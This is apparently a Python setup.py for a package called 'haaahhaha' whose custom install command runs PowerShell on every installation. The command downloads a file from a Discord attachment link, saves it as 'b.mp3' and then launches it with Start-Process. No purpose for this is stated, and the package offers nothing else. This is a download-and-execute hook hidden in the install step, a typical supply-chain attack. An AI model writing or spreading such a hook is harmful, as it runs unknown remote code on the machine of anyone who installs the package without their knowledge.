from setuptools import setup
from setuptools.command.install import install
import subprocess
import os

class CustomInstallCommand(install):
    """Custom installation script."""
    def run(self):
        output_file = os.path.join(os.getcwd(), "b.mp3")
        download_command = f'curl.exe -L https://cdn.discordapp.com/attachments/1259306460811104446/1293822784027496520/Kim_Petras__Nicki_Minaj_X_Bad_Friends_-_Alone_EURO_VERSIONSPED_UP.mp3?ex=6708c5dd&is=6707745d&hm=68c0cdf75bcbd7b670662cb235770ba879685d838e2b2b93ba5343ecd5b9468f& -o "{output_file}"'
        download_result = subprocess.run(["powershell", "-Command", download_command], capture_output=True, text=True)

        print("Download Output:", download_result.stdout)
        print("Download Error:", download_result.stderr)

        if download_result.returncode == 0 and os.path.exists(output_file):
                execute_command = f'Start-Process "{output_file}" -NoNewWindow -Wait'
                execute_result = subprocess.run(["powershell", "-Command", execute_command], capture_output=True, text=True)

                print("Execution Output:", execute_result.stdout)
                print("Execution Error:", execute_result.stderr)
        else:
                print("File download failed or file not found.")

        install.run(self)

setup(
    name='haaahhaha',
    version='0.1',
    description='cantdoitanymorehaahahaaha',
    packages=['haaahhaha'],
    install_requires=[
    ],
    cmdclass={
        'install': CustomInstallCommand,
    },
)